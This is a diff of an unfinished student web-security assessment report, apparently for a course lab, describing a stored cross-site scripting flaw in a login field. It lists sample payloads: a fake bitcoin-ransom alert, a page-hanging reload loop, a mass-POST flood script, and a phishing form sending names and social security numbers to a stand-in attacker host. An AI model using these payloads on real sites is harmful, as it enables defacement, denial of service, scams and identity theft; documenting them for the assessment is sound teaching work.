@@ -2,6 +2,7 @@
 <html>
 <head>
 	<title>Lab 13</title>
+	<link rel="stylesheet" href="style.css" type="text/css" />
 </head>
 <body>
 	<h1>Assignment 4: Security and Privacy Assessment of a Web Application</h1>
@@ -27,6 +28,42 @@
 	 		<li>The database can be flooded and potentially have its resources consumed by repeated logging</li>
 	 	</ol>
 	<h2>Issues Found </h2>
+		<h4>Cross Site Scripting (XSS)</h4>
+			<p>Cross site scripting is possible as user input is not validated sufficiently. Malicious input can be posted and it is then later on echoed back to client. It is of fairly high severity, as it can mangle the webpage, make it inoperable, or attempt to manipulate the end user. This vulnerability exists in the main Javscript file at the location in the picture below. As one can see, the login variable is taken directly from user input, and is only checked to make sure it is not undefined. This becomes a problem when the script echoes back the list of logins later on, as someone can insert whatever javascript or html they want in this field, and it will later execute on the clients browser.</p>
+			<img src="Location_1.png" alt="First vulnerability location" id="scale_picture_50">
+			<p>As an example, posting to the website at the /sendLocation route with:  &ltimg src="https://pics.onsizzle.com/hacker-voice-im-in-9461453.png" alt="hacker doggo" width=500 height=384&gt in the login field yielded the picture below being placed on the webpage. </p>
+			<img src="Inserting_picture.png" alt="dog meme inserted" id="scale_picture_30">
+			<p> More sinister examples include posting things such as:</p>
+			<ul>
+				<li>&ltscript&gtalert("Hello! Your data is unsecure. Please send a donation in bitcoin to the water foundation at the address 1HesYJSP1QqcyPEjnQ9vzBL1wujruNGe7R to make your data secure again!") &lt/script&gt<br><img src="Phony_Alert.png" alt="phony alert" id="scale_picture_50"><br><br></li>
+				<li>&ltscript&gtwhile(1){location.reload(true)}&lt/script&gt  This makes the page hang and never load:<br><img src="Not_loading.png" alt="First vulnerability location" id="scale_picture_40"><br><br></li>
+				<li>Picture same as the above example, but many POSTS are made. Could be made infinite loop, and every person trying to access page would be posting a ton, which becomes sort of a psuedo DDOS.<br> &ltscript&gtfor (i = 0; i &lt 10000; i++) { var http = new XMLHttpRequest();
+					var url = "http://localhost:3000/sendLocation"; <br>
+					var params = "login=crashtestdummies&lat=12&lng=12"; <br>
+					http.open("POST", url, true); <br>
+					http.setRequestHeader("Content-type", "application/x-www-form-urlencoded"); <br>
+					http.onreadystatechange = function() { <br>
+					if(http.readyState == 4 && http.status == 200) { <br>
+					console.log("readystatechange!"); }}<br>
+					http.send(params); <br>
+					console.log("request sent!")}&lt/script&gt <br><br></li>
+				<li>&ltform action="http://phishingserver.net" method="post"&gt &ltlabel for="name"&gtPlease enter your name:  &lt/label&gt&ltinput name="name" id="name" value="JohnDoe7"&gt&ltbr&gt&ltlabel for="SSN"&gt Please enter your social security number:  &lt/label&gt&ltinput name="SSN" value="0000000"&gt &ltbr&gt &ltbutton&gtContinue Logging In!&lt/button>&lt/form&gt<br><img src="Phishing.png" alt="Phishing form" id="scale_picture_40"></li>
+			</ul>
+			<p>The other fields are more thoroughly checked for validity, and they appear to be secure. To resolve this issue, there are a few paths. </p> 
+			<p>More stringent check on user input, or only allowing</p>
+			Psuedo Unvalidated Redirects/Forwards
+			Could store User logins in another database, and if a certain login or login+password are input, then the headers could be set selectively ie Access-Control-Allow-Origin is set differently for each request if you have a valid login etc.
+
+			
+			 
+
+			RESOLUTION
+
+		<h4>Injection Vulnerability - All data accessible</h4>
+
+		<h4>Attacking The Database</h4>
+		Psuedo Cross Site Request Forgery
+		<h4>Other Issues</h4>
 
 		For each issue that you find, document:
 		Issue (e.g., database injection, really bad programming practice)
